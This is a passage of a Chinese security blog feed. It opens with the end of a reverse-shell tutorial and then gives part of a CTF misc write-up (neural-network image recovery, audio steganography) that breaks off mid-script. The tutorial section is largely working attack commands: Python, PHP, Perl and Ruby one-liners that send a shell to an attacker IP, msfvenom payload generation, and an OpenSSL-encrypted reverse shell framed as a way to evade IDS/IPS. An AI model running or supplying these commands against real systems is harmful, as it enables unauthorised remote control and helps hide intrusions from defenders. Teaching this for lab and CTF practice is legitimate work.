<code>pipe2</code> 相连。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>至此，我们已经基本弄清了魔法命令的工作原理，总结如下：利用 Bash 语法：命令组、管道和重定向等让 curl 命令和 sh 命令的 <code>stdin</code> 和 <code>stdout</code> 交错相连；又添加 <code>-T</code> 等参数和文件名 <code>.</code> 让 curl 读取 <code>stdin</code> 的内容发送到服务端，同时读取服务端返回的数据并输出到 <code>stdout</code>。</p><h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><h4 id="为何要关闭-sh-命令的-fd-3？"><a href="#为何要关闭-sh-命令的-fd-3？" class="headerlink" title="为何要关闭 sh 命令的 fd 3？"></a>为何要关闭 sh 命令的 fd 3？</h4><p>测试发现其实不关闭 sh 命令的 fd 3 反弹 shell 也可以正常工作。</p><h4 id="命令的作用是什么？"><a href="#命令的作用是什么？" class="headerlink" title=": 命令的作用是什么？"></a>: 命令的作用是什么？</h4><p>建立匿名管道 <code>pipe1</code>，且 <code>:</code> 命令不会去读 <code>pipe1</code>，不影响反弹 shell 工作。如果把 <code>:</code> 换成同样不会读 <code>stdin</code> 的 <code>true</code> 命令，反弹 shell 仍然可以工作，但如果换成会读 <code>stdin</code> 的命令如 <code>cat</code>，反弹 shell 就无法工作了。</p><h2 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h2><h3 id="Python-脚本反弹shell"><a href="#Python-脚本反弹shell" class="headerlink" title="Python 脚本反弹shell"></a>Python 脚本反弹shell</h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><h3 id="php-脚本反弹shell"><a href="#php-脚本反弹shell" class="headerlink" title="php 脚本反弹shell"></a>php 脚本反弹shell</h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><h3 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a>Perl 脚本反弹shell</h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;47.101.57.72&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">2333</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure><h3 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">ruby -rsocket -e <span class="hljs-symbol">&#x27;c</span>=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br>或<br>ruby -rsocket -e <span class="hljs-symbol">&#x27;exit</span> <span class="hljs-keyword">if</span> fork;c=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">msfvenom -l payloads | grep <span class="hljs-symbol">&#x27;cmd</span>/unix/<span class="hljs-keyword">reverse</span>&#x27;<br></code></pre></td></tr></table></figure><p>比如，我们获取一个python反弹shell的一句话：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=47.xxx.xxx.72 <span class="hljs-attribute">LPORT</span>=2333 -f raw<br></code></pre></td></tr></table></figure><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><blockquote><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p></blockquote><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x509 -newkey rsa:<span class="hljs-number">2048</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p><h3 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h3><p>实验环境：Linux</p><p>目标机：</p><ul><li>系统：Linux</li><li>IP：192.168.1.8</li></ul><p>攻击机：</p><ul><li>系统：Linux</li><li>IP：47.xxx.xxx.72</li></ul><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem -cert cert.pem -port <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; <span class="hljs-built_in">rm</span> /tmp/s<br></code></pre></td></tr></table></figure><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X CBCTF 2023｜无畏者先行</title>
    <link href="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/"/>
    <url>/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Justpainting"><a href="#Justpainting" class="headerlink" title="Justpainting"></a>Justpainting</h2><p>010打开压缩包，发现结尾多了五个？，猜测加密压缩包的密码是五位</p><p>爆破得到密码11452</p><p>打开得到一个python脚本和一张jbn.pth</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JBN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(JBN, self).__init__()<br>        self.main = nn.Sequential(<br>            nn.Linear(<span class="hljs-number">100</span>, <span class="hljs-number">256</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">452</span> * <span class="hljs-number">280</span>),<br>            nn.Tanh()<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        img = self.main(x)<br>        img = img.view(-<span class="hljs-number">1</span>, <span class="hljs-number">452</span>, <span class="hljs-number">280</span>)<br>        <span class="hljs-keyword">return</span> img<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">watch_flag</span>(<span class="hljs-params">img</span>):<br>    flag = cv2.imread(<span class="hljs-string">&#x27;./data/data/flag.png&#x27;</span>)<br>    gray_image = cv2.cvtColor(flag, cv2.COLOR_BGR2GRAY)<br>    flag_tensor = torch.from_numpy(np.array(gray_image))<br>    flag_tensor = flag_tensor.unsqueeze(<span class="hljs-number">0</span>).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    img_tensor = img<br>    flag_tensor = flag_tensor.unsqueeze(<span class="hljs-number">0</span>)<br>    img_tensor = img_tensor.unsqueeze(<span class="hljs-number">0</span>)<br>    loss_fn = torch.nn.MSELoss()<br>    loss = loss_fn(flag_tensor.<span class="hljs-built_in">float</span>(), img_tensor)<br>    <span class="hljs-keyword">return</span> loss<br><br><br>jbn = JBN()<br>g_optimizer = torch.optim.Adam(jbn.parameters(), lr=<span class="hljs-number">0.001</span>)<br>min_loss = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)<br><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    random_noise = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    jbn_img = jbn(random_noise)<br>    g_optimizer.zero_grad()<br>    g_loss = watch_flag(jbn_img)<br>    g_loss.backward()<br>    g_optimizer.step()<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">if</span> g_loss &lt; min_loss:<br>            min_loss = g_loss<br>            torch.save(jbn.state_dict(), <span class="hljs-string">&#x27;jbn.pth&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>题目的意思很明确，根据源码和jbn.pth反向生成flag</p><p>chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JBN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(JBN, self).__init__()<br>        self.main = nn.Sequential(<br>            nn.Linear(<span class="hljs-number">100</span>, <span class="hljs-number">256</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">452</span> * <span class="hljs-number">280</span>),<br>            nn.Tanh()<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        img = self.main(x)<br>        img = img.view(-<span class="hljs-number">1</span>, <span class="hljs-number">452</span>, <span class="hljs-number">280</span>)<br>        <span class="hljs-keyword">return</span> img<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_flag</span>(<span class="hljs-params">jbn_model, output_path</span>):<br>    jbn = JBN()<br>    jbn.load_state_dict(torch.load(jbn_model))<br>    jbn.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        random_noise = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>        generated_img = jbn(random_noise)<br>        generated_img = generated_img.squeeze().numpy()<br>        generated_img = (generated_img + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>  <span class="hljs-comment"># 将图像像素值映射到0-1之间</span><br>        generated_img = np.clip(generated_img, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># 将像素值限制在0-1之间</span><br><br>        plt.imshow(generated_img, cmap=<span class="hljs-string">&#x27;gray&#x27;</span>)<br>        plt.axis(<span class="hljs-string">&#x27;off&#x27;</span>)<br>        plt.savefig(output_path, bbox_inches=<span class="hljs-string">&#x27;tight&#x27;</span>, pad_inches=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 保存生成的图像</span><br>        plt.show()<br><br><br>generate_flag(<span class="hljs-string">&#x27;jbn.pth&#x27;</span>, <span class="hljs-string">&#x27;generated_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1697858621475.png" alt="1697858621475"></p><h2 id="justlisten"><a href="#justlisten" class="headerlink" title="justlisten"></a>justlisten</h2><p>扫描汉信码hint.png，得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">length</span>:<span class="hljs-number">189</span><br><span class="hljs-attribute">0urS3cret</span><br></code></pre></td></tr></table></figure><p>010打开this is our secret.bmp</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698146949289.png" alt="1698146949289"></p><p>9e97ba2a是oursecret的特征</p><p>使用oursecret对bmp文件进行提取，密码是0urS3cret</p><p>提取出一个haha.txt</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#125;&#123;-<span class="hljs-string">?!</span><br></code></pre></td></tr></table></figure><p>应该是一个字典</p><p>用Audacity查看嘘.wav文件，看它的频谱图，得知它的频率为[800,900,1000,1100,1200,1300,1400,1500,1700,1800]以及它的每个频率变化的时间为0.1s，同时可以得知它的采样频率为44100</p><p>脚本读取wav文件的数据长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> wave<br><span class="hljs-keyword">import</span> scipy.fftpack <span class="hljs-keyword">as</span> fftpack<br><br>SAMPLE_RATE = <span class="hljs-number">44100</span>                                     <br>SAMPLE_TIME = <span class="hljs-number">0.1</span>                                       <br>SAMPLE_NUM = <span class="hljs-built_in">int</span>(SAMPLE_RATE * SAMPLE_TIME)            <span class="hljs-comment">#4410 </span><br>LIST = [<span class="hljs-number">800</span>, <span class="hljs-number">900</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1100</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">1300</span>, <span class="hljs-number">1400</span>, <span class="hljs-number">1500</span>, <span class="hljs-number">1600</span>, <span class="hljs-number">1700</span>]<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;嘘.wav&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:          <span class="hljs-comment">#读取为数组</span><br>    wav_data = np.frombuffer(f.readframes(-<span class="hljs-number">1</span>), dtype=np.int16)<br>    N = <span class="hljs-built_in">len</span>(wav_data)                                   <span class="hljs-comment">#获取数据长度</span><br><br>    <span class="hljs-built_in">print</span> (N)   <span class="hljs-comment">#1666980</span><br><br>a = (N/(<span class="hljs-number">44100</span>*<span class="hljs-number">0.1</span>))/<span class="hljs-number">189</span><br><span class="hljs-built_in">print</span>(a) <span class="hljs-comment">#2.0</span><br></code></pre></td></tr></table></figure><p>可以得知数据长度N&#x3D;1666980，然后再a &#x3D; (N&#x2F;(44100*0.1))&#x2F;42来计算每个字符占了多少时长为0.2s</p><p>处理一下数字信号，并根据分离出的字典来获取隐藏的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> wave<br><span class="hljs-keyword">import</span> scipy.fftpack <span class="hljs-keyword">as</span> fftpack<br><br>SAMPLE_RATE = <span class="hljs-number">44100</span>                                     <br>SAMPLE_TIME = <span class="hljs-number">0.1</span>                                       <br>SAMPLE_NUM = <span class="hljs-built_in">int</span>(SAMPLE_RATE * SAMPLE_TIME)            <span class="hljs-comment">#4410 </span><br>LIST = [<span class="hljs-number">800</span>, <span class="hljs-number">900</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1100</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">1300</span>, <span class="hljs-number">1400</span>, <span class="hljs-number">1500</span>, <span class="hljs-number">1600</span>, <span class="hljs-number">1700</span>]   <br><br><br><span class="hljs-comment"># 傅里叶变换</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fft</span>(<span class="hljs-params">data</span>):<br>    N = <span class="hljs-built_in">len</span>(data)                                   <span class="hljs-comment">#获取数据长度</span><br>    fft_data = fftpack.fft(data)                    <span class="hljs-comment">#得到频域信号                      </span><br>    abs_fft = np.<span class="hljs-built_in">abs</span>(fft_data)                      <span class="hljs-comment">#计算幅值    </span><br>    abs_fft = abs_fft/(N/<span class="hljs-number">2</span>)                             <br>    half_fft = abs_fft[<span class="hljs-built_in">range</span>(N//<span class="hljs-number">2</span>)]                 <span class="hljs-comment">#取频域信号的前半部分</span><br><br>    <span class="hljs-keyword">return</span> half_fft<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_100ms</span>(<span class="hljs-params">wave_data_100_ms</span>):                     <span class="hljs-comment">#解码100毫秒的音频数据</span><br>    fft_ret = fft(wave_data_100_ms)<br>    <span class="hljs-keyword">for</span> index, freq <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(LIST):<br>        <span class="hljs-keyword">if</span> np.<span class="hljs-built_in">max</span>(fft_ret[<span class="hljs-built_in">int</span>(freq*SAMPLE_TIME) - <span class="hljs-number">2</span> : <span class="hljs-built_in">int</span>(freq*SAMPLE_TIME) + <span class="hljs-number">2</span>]) &gt; <span class="hljs-number">0.8</span>:<br>            <span class="hljs-built_in">print</span>(freq, <span class="hljs-string">&#x27;Hz有值&#x27;</span>)<br>            <span class="hljs-keyword">return</span> index<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_sentence</span>(<span class="hljs-params">wav_data</span>):                          <span class="hljs-comment">#解码整个句子</span><br>    _100ms_count = <span class="hljs-built_in">len</span>(wav_data) // SAMPLE_NUM          <br>    <span class="hljs-built_in">print</span>(<span 